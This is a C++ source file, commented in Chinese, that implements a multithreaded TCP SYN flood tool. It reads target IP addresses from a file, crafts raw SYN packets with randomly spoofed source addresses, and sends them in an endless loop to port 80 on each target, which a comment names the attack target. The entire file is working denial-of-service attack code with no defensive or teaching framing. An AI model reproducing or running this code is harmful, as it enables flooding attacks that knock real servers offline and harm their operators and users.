#include "regex"
#include "mycpp.h"
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
 
#define	LOCALPORT 	3455			
#define	DESTPORT 	80			

vector<string> ips;
void getIpSet()
{
    string pattern = "((?:(?:25[0-5]|2[0-4]\\d|((1\\d{2})|([1-9]?\\d)))\\.){3}(?:25[0-5]|2[0-4]\\d|((1\\d{2})|([1-9]?\\d))))";
    ifstream in("ip.txt"); string line; regex r(pattern); smatch results; set<string> ip_set;
    while(getline(in,line)) if(regex_search(line,results,r)) ip_set.insert(results.str());
    ips.insert(ips.begin(),ip_set.begin(),ip_set.end());
}

void *thread(void *arg)
{
	long id = (long)(arg); struct timespec req; req.tv_sec=0; req.tv_nsec=8000000;
	int sockfd; struct sockaddr_in addr; int on; bzero(&addr,sizeof(struct sockaddr_in)); 
	addr.sin_family=AF_INET; addr.sin_port=htons(DESTPORT);inet_aton(ips[id].c_str(),&addr.sin_addr);
	
	sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP); setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));	
	setuid(getuid()); /*获得超级用户的权限*/
	char buffer[100];/*定义存放数据报的缓存区*/
	
	
	/*数据报的长度即IP头部与TCP头部之后*/
	struct ip *ipp; struct tcphdr *tcp;
	int head_len;
	head_len=sizeof(struct ip)+sizeof(struct tcphdr);
	bzero(buffer,100);
	/*开始填充IP数据报的头部*/
	ipp=(struct ip *)buffer;
	ipp->ip_v=IPVERSION; /*IPV4*/
	ipp->ip_hl=sizeof(struct ip)>>2;/*IP数据报的头部长度*/
	ipp->ip_tos=0;               /*服务类型*/
	ipp->ip_len=htons(head_len);/*IP数据报的长度*/
	ipp->ip_id=0;             /*IP id 由内核填写*/
	ipp->ip_off=0;      /*有内核填写*/
	ipp->ip_ttl=MAXTTL;
	ipp->ip_p=IPPROTO_TCP;         /*传输层协议为TCP*/
	ipp->ip_dst=addr.sin_addr;     /*目的地址，即攻击目标*/
	printf("dest address is %s\n",inet_ntoa(addr.sin_addr));
	/*开始填写TCP数据报*/
	tcp=(struct tcphdr*)(buffer+sizeof(struct ip)); /*获取指向TCP头部的指针*/
	tcp->source=htons(LOCALPORT+id);
	tcp->dest=addr.sin_port; /*目的端口*/
	tcp->seq=random();      /*随机产生序列号*/
	tcp->ack_seq=0;
	tcp->doff=5;
	tcp->syn=1; /*表示SYN数据报*/
	tcp->check=0;
	while(1){
		ipp->ip_src.s_addr=random();
		sendto(sockfd,buffer,head_len,0,(struct sockaddr *)&addr,sizeof(struct sockaddr));
		nanosleep(&req, NULL);
	}

}

int main()
{
	getIpSet(); int size = ips.size();pthread_t tids[size]; 
	for(int i = 0; i < size; i++) pthread_create(&tids[i],NULL,thread,(void*)i);
	for(int i = 0; i < size; i++) pthread_join(tids[i],NULL);
	return 0;
}


